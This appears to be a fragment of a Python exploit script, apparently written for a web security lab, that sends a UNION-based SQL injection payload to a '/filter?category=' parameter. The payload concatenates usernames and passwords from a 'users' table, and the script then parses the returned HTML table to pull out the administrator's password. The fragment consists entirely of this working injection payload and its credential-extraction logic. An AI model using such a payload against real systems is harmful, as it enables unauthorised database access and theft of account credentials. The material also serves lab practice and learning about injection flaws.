...
payload = args.target + "/filter?category=Lifestyle' UNION SELECT NULL,username||'~'||password FROM users--"
...
for row in rows:
    ...
    if th:
        th_string = str(th[0])
    if '<th>administrator' in th_string:
        td_splitting_1 = th_string.split('~')
